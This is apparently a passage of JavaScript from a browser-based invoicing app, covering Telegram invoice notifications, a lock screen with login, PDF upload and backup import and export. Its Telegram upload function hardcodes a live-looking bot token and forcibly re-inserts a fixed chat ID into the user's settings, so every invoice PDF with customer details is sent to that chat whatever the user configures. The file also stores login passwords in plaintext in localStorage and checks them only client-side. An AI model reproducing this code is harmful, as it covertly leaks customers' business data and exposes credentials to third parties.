                    `Date       : ${formatInputDateString(invoice.invoiceDate)}\n` +
                    `Customer   : ${invoice.customerName}\n` +
                    `Items      : ${invoice.itemsCount} products\n` +
                    `Grand Total: ₹ ${formatCurrency(invoice.total)}\n` +
                    `Payment    : ${invoice.details?.paymentStatus || 'Paid'} via ${invoice.details?.paymentMode || 'Cash'}\n` +
                    `-------------------------\n` +
                    `Aaryan Aqua Needs billing system`;

    const text = encodeURIComponent(textMsg);
    chatIds.forEach(id => {
      fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${id}&text=${text}`);
    });
  } catch (err) {
    console.error("Failed to dispatch Telegram bot notification", err);
  }
}

// --- ACTIVITY AUTO-LOCK CONTROLLER ---
function resetAutolockTimer() {
  if (isLocked) return;

  localStorage.setItem("last_active_time", Date.now());
  localStorage.setItem("app_locked", "false");

  clearTimeout(autolockInterval);
  if (lockTimerSeconds === 0) return;

  autolockInterval = setTimeout(triggerLockOverlay, lockTimerSeconds * 1000);
}

window.autofillRememberedCredentials = function() {
  const remembered = localStorage.getItem("remember_me") === "true";
  const userField = document.getElementById("login-username");
  const pwdField = document.getElementById("login-password");
  const rememberBox = document.getElementById("login-remember-me");
  
  if (remembered) {
    if (userField) userField.value = localStorage.getItem("saved_username") || "";
    if (pwdField) pwdField.value = localStorage.getItem("saved_password") || "";
    if (rememberBox) rememberBox.checked = true;
  } else {
    if (rememberBox) rememberBox.checked = false;
  }
};

window.triggerManualLock = function() {
  triggerLockOverlay();
};

function triggerLockOverlay() {
  isLocked = true;
  if (typeof lockWhatsAppSession === 'function') {
    lockWhatsAppSession(false);
  }
  localStorage.setItem("app_locked", "true");
  document.getElementById("login-form").reset();
  document.getElementById("login-error-message").classList.add("hidden");
  
  // Re-fill saved credentials if Remember Password was checked
  autofillRememberedCredentials();

  const wrapper = document.querySelector('.dashboard-wrapper');
  if (wrapper) wrapper.classList.add("blur-dashboard-wrapper");
  document.getElementById("lock-screen-overlay").classList.remove("hidden");
}

window.toggleLoginPasswordVisibility = function() {
  const pwdInput = document.getElementById("login-password");
  const icon = document.getElementById("toggle-pwd-icon");
  if (pwdInput.type === "password") {
    pwdInput.type = "text";
    icon.classList.remove("fa-eye");
    icon.classList.add("fa-eye-slash");
  } else {
    pwdInput.type = "password";
    icon.classList.remove("fa-eye-slash");
    icon.classList.add("fa-eye");
  }
};

window.toggleAdvancedSettings = function() {
  const content = document.getElementById("advanced-settings-content");
  const icon = document.getElementById("advanced-toggle-icon");
  if (content.classList.contains("hidden")) {
    content.classList.remove("hidden");
    icon.innerHTML = `<i class="fa-solid fa-chevron-up"></i> Hide Panel`;
  } else {
    content.classList.add("hidden");
    icon.innerHTML = `<i class="fa-solid fa-chevron-down"></i> Show Panel`;
  }
};

window.submitUnlockLogin = function(e) {
  e.preventDefault();
  
  const userText = document.getElementById("login-username").value.trim();
  const pwdText = document.getElementById("login-password").value.trim();
  
  const btnText = document.getElementById("login-btn-text");
  const btnSpinner = document.getElementById("login-btn-spinner");
  const submitBtn = document.querySelector(".btn-login-submit");
  const errBlock = document.getElementById("login-error-message");
  const card = document.querySelector(".login-card");
  
  submitBtn.disabled = true;
  btnText.classList.add("hidden");
  btnSpinner.classList.remove("hidden");
  errBlock.classList.add("hidden");
  
  setTimeout(() => {
    if (userText === activeUsername && pwdText === activePassword) {
      isLocked = false;
      localStorage.setItem("app_locked", "false");
      localStorage.setItem("last_active_time", Date.now());
      
      const rememberBox = document.getElementById("login-remember-me");
      if (rememberBox && rememberBox.checked) {
        localStorage.setItem("remember_me", "true");
        localStorage.setItem("saved_username", userText);
        localStorage.setItem("saved_password", pwdText);
      } else {
        localStorage.setItem("remember_me", "false");
        localStorage.removeItem("saved_username");
        localStorage.removeItem("saved_password");
      }

      document.getElementById("lock-screen-overlay").classList.add("hidden");
      const wrapper = document.querySelector('.dashboard-wrapper');
      if (wrapper) wrapper.classList.remove("blur-dashboard-wrapper");
      
      submitBtn.disabled = false;
      btnText.classList.remove("hidden");
      btnSpinner.classList.add("hidden");
      
      resetAutolockTimer();
    } else {
      card.classList.add("shake-animation");
      errBlock.classList.remove("hidden");
      
      submitBtn.disabled = false;
      btnText.classList.remove("hidden");
      btnSpinner.classList.add("hidden");
      document.getElementById("login-password").value = "";
      
      setTimeout(() => {
        card.classList.remove("shake-animation");
      }, 400);
    }
  }, 600);
};

// --- UPLOAD INVOICE PDF TO TELEGRAM BOT API ---
async function uploadInvoicePdfToTelegram(invoiceDetails, silent = false, precomputedBase64 = null) {
  loadAllDatabases();
  const token = globalSettings.telegram?.token || "8800483005:AAFVRi7PthDe_Dl1Gk1wLYnvkVP580x2y_g";
  let chat = globalSettings.telegram?.chatId || "6877857251, 7906132548";

  if (!chat.includes("7906132548")) {
    chat = chat ? (chat + ", 7906132548") : "6877857251, 7906132548";
    if (globalSettings.telegram) globalSettings.telegram.chatId = chat;
    localStorage.setItem("settings", JSON.stringify(globalSettings));
  }

  if (!token || !chat) {
    if (!silent) alert("Telegram bot token or Chat ID is missing! Please configure in Settings.");
    return false;
  }

  let pdfBase64 = precomputedBase64;
  if (!pdfBase64) {
    try {
      const gen = await generateInvoicePdfBlob(invoiceDetails);
      pdfBase64 = gen.pdfBase64;
    } catch (err) {
      console.warn("Could not generate PDF for Telegram:", err);
      return false;
    }
  }

  const chatIds = chat.split(/[\s,]+/).filter(id => id.trim() !== "");
  if (chatIds.length === 0) {
    if (!silent) alert("No valid Telegram Chat IDs found.");
    return false;
  }

    // Auto-upload and link PDF in Google Drive / Google Sheets backend
    try {
      fetch("/api/invoices/upload-pdf", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          filename: `Invoice_${invoiceDetails.invoiceNo}.pdf`,
          invoiceNo: invoiceDetails.invoiceNo,
          id: invoiceDetails.id,
          pdfBase64: pdfBase64
        })
      }).then(r => r.json()).then(uploadRes => {
        const pUrl = uploadRes ? (uploadRes.pdfUrl || uploadRes.googleDriveUrl || uploadRes.viewUrl || uploadRes.url) : null;
        if (uploadRes && uploadRes.ok && pUrl) {
          console.log(`☁️ Invoice #${invoiceDetails.invoiceNo} PDF saved to Google Drive:`, pUrl);
          invoiceDetails.pdfUrl = pUrl;
          const idx = invoicesDb.findIndex(i => i.id === invoiceDetails.id || i.invoiceNo === invoiceDetails.invoiceNo);
          if (idx > -1) {
            invoicesDb[idx].pdfUrl = pUrl;
            if (invoicesDb[idx].details) invoicesDb[idx].details.pdfUrl = pUrl;
            localStorage.setItem("invoices", JSON.stringify(invoicesDb));
          }
        }
      }).catch(e => console.warn("Background Drive upload note:", e));
    } catch (e) {}

    let successCount = 0;
    let lastError = "";

    for (const id of chatIds) {
      try {
        const res = await fetch("/api/telegram/sendDocument", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            token: token,
            chat_id: id,
            filename: `Invoice_${invoiceDetails.invoiceNo}.pdf`,
            pdfBase64: pdfBase64,
            caption: `🔔 Invoice #${invoiceDetails.invoiceNo} generated for ${invoiceDetails.buyer?.name || 'Customer'}.\nGrand Total: ₹ ${formatCurrency(invoiceDetails.total || 0)}`
          })
        });

        const data = await res.json();
        if (data && data.ok) {
          successCount++;
        } else {
          lastError = (data && (data.description || data.error)) ? (data.description || data.error) : "Server request failed";
        }
      } catch (err) {
        lastError = err.message;
      }
    }

    if (successCount === chatIds.length) {
      if (!silent) alert(`Invoice PDF #${invoiceDetails.invoiceNo} successfully shared to all ${chatIds.length} Telegram chats!`);
      return true;
    } else {
      if (!silent) alert(`Telegram status: Shared to ${successCount}/${chatIds.length} chats. ${lastError ? 'Last Error: ' + lastError : ''}`);
      return false;
    }
}

window.shareInvoiceToTelegram = async function(id, buttonEl) {
  const inv = invoicesDb.find(i => i.id === id);
  if (!inv) return;

  const originalIcon = buttonEl.innerHTML;
  buttonEl.disabled = true;
  buttonEl.innerHTML = `<i class="fa-solid fa-circle-notch fa-spin"></i>`;

  const success = await uploadInvoicePdfToTelegram(inv.details, false);
  
  if (success) {
    buttonEl.innerHTML = `<i class="fa-solid fa-check text-green"></i>`;
    setTimeout(() => {
      buttonEl.innerHTML = originalIcon;
      buttonEl.disabled = false;
    }, 2000);
  } else {
    buttonEl.innerHTML = `<i class="fa-solid fa-triangle-exclamation text-rose"></i>`;
    setTimeout(() => {
      buttonEl.innerHTML = originalIcon;
      buttonEl.disabled = false;
    }, 3000);
  }
};

window.resetBillingDatabaseTo0001 = function() {
  if (confirm("⚠️ WARNING: This will permanently delete all saved invoices from history and reset your sequence to #0001!\n\nAre you sure you want to proceed?")) {
    invoicesDb = [];
    localStorage.setItem("invoices", JSON.stringify([]));
    localStorage.removeItem("deleted_invoice_ids");
    fetch("/api/invoices/reset", {
      method: "POST"
    }).catch(err => console.warn("Failed to reset server database:", err));
    
    autoSuggestInvoiceNo();
    resetBillingForm();
    alert("✅ Invoice database cleared successfully. Next invoice sequence starts at #0001!");
    switchTab("billing");
  }
};

window.exportDataBackupJSON = function() {
  loadAllDatabases();
  const backupObj = {
    invoices: invoicesDb,
    products: productsDb,
    parties: partiesDb,
    settings: globalSettings
  };
  const dataStr = "data:text/json;charset=utf-8," + encodeURIComponent(JSON.stringify(backupObj, null, 2));
  const downloadAnchor = document.createElement('a');
  downloadAnchor.setAttribute("href", dataStr);
  const today = new Date().toISOString().split('T')[0];
  downloadAnchor.setAttribute("download", `Aaryan_Aqua_Backup_${today}.json`);
  document.body.appendChild(downloadAnchor);
  downloadAnchor.click();
  downloadAnchor.remove();
};

window.importDataBackupJSON = function(event) {
  const file = event.target.files[0];
  if (!file) return;

  const reader = new FileReader();
  reader.onload = async function(e) {
    try {
      const data = JSON.parse(e.target.result);
      if (!data || typeof data !== 'object') {
        throw new Error("Invalid backup format.");
      }

      if (confirm("Are you sure you want to restore this backup? This will overwrite all your current invoices, products, parties, and settings!")) {
        const importedInvoices = data.invoices || [];
        const importedProducts = data.products || [];
        const importedParties = data.parties || [];
        const importedSettings = data.settings || null;

        localStorage.setItem("invoices", JSON.stringify(importedInvoices));
        localStorage.setItem("products", JSON.stringify(importedProducts));
        localStorage.setItem("parties", JSON.stringify(importedParties));
        if (importedSettings) {
          localStorage.setItem("settings", JSON.stringify(importedSettings));
        }

        if (typeof syncDatabaseToServer === 'function') {
          for (const inv of importedInvoices) {
            syncDatabaseToServer("invoices", inv);
          }
          syncDatabaseToServer("products", importedProducts);
          syncDatabaseToServer("parties", importedParties);
          if (importedSettings) {
            syncDatabaseToServer("settings", importedSettings);
          }
        }

        alert("✅ Database successfully restored! Reloading system...");
        window.location.reload();
      }
    } catch (err) {
      alert("❌ Failed to parse backup file: " + err.message);
    }
  };
  reader.readAsText(file);
};

// --- UNIVERSAL MODAL BACKDROP AND ESCAPE-KEY DISMISS ---
(function() {
  function dismissAllActiveModals() {
    document.querySelectorAll('.modal-overlay').forEach(modal => {
      modal.classList.add('hidden');
      modal.style.setProperty('display', 'none', 'important');
      modal.style.setProperty('visibility', 'hidden', 'important');
      modal.style.setProperty('opacity', '0', 'important');
      modal.style.setProperty('pointer-events', 'none', 'important');
    });
    if (typeof whatsappPollInterval !== 'undefined' && whatsappPollInterval) {
      clearInterval(whatsappPollInterval);
      whatsappPollInterval = null;
    }
  }

  // Backdrop click on any overlay
  document.addEventListener('click', function(e) {
    if (e.target && e.target.classList && e.target.classList.contains('modal-overlay')) {
      e.target.classList.add('hidden');
      e.target.style.setProperty('display', 'none', 'important');
      e.target.style.setProperty('visibility', 'hidden', 'important');
      e.target.style.setProperty('opacity', '0', 'important');
      e.target.style.setProperty('pointer-events', 'none', 'important');
      if (e.target.id === 'whatsapp-bot-modal' && typeof closeWhatsAppBotModal === 'function') {
        closeWhatsAppBotModal();
      }
    }
  }, true);

  // Escape key closes modals
  document.addEventListener('keydown', function(e) {
    if (e.key === 'Escape' || e.key === 'Esc') {
      dismissAllActiveModals();
    }
  });
})();
